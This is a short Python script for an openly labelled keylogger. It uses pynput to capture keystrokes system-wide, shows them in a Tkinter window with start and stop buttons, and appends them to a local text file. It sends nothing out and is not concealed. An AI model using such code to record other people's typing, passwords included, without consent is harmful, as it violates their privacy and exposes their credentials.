from pynput import keyboard
import tkinter as tk


class KeyLogger:
    def __init__(self, filename: str = "kahot.txt"):
        self.filename = filename
        self.root = tk.Tk()
        self.root.title("Key Logger")
        self.text_area = tk.Text(self.root, height=10, width=50)
        self.text_area.pack(pady=10)
        self.start_button = tk.Button(self.root, text="Start Logging", command=self.start_logging)
        self.start_button.pack(pady=5)
        self.stop_button = tk.Button(self.root, text="Stop Logging", command=self.stop_logging)
        self.stop_button.pack(pady=5)
        self.is_logging = False

    @staticmethod
    def get_char(key):
        try:
            return key.char
        except AttributeError:
            return str(key)

    def on_press(self, key):
        if self.is_logging:
            char = self.get_char(key)
            self.text_area.insert(tk.END, char)
            with open(self.filename, 'a') as logs:
                logs.write(char)

    def start_logging(self):
        self.is_logging = True
        self.text_area.delete(1.0, tk.END)
        self.text_area.insert(tk.END, "Logging started...")

    def stop_logging(self):
        self.is_logging = False
        self.text_area.insert(tk.END, "\nLogging stopped.")

    def main(self):
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()
        self.root.mainloop()


if __name__ == '__main__':
    logger = KeyLogger()
    logger.main()
    input()
